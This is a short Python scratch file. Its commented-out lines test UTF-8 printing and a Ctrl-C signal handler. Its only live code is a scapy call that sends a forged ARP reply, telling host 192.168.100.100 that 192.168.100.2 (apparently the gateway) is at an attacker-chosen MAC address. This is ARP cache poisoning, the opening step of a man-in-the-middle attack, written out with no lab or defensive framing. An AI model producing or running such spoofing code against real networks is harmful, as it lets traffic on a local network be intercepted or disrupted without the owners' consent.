#!/usr/bin/python3
# -*- coding: utf-8 -*-

# import io
# import sys

# sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding='utf-8')


# a='中文测试:'
# print (a)



# import signal,sys,time

# def sigint_handler(signum,frame):
# 	print ('ok')
# 	sys.exit()

# def for_for():
# 	signal.signal(signal.SIGINT,sigint_handler)
# 	while True:
# 		print ('1')
# 		time.sleep(1)

# for_for()



from scapy.all import *
result_raw = sendp(Ether(src="00:50:56:f2:d2:4d",dst="00:0c:29:63:c1:fc")/
	ARP(op=2, hwsrc="00:50:56:f2:d2:4d",hwdst="00:0c:29:63:c1:fc",psrc="192.168.100.2",pdst="192.168.100.100"),iface="eno16777736")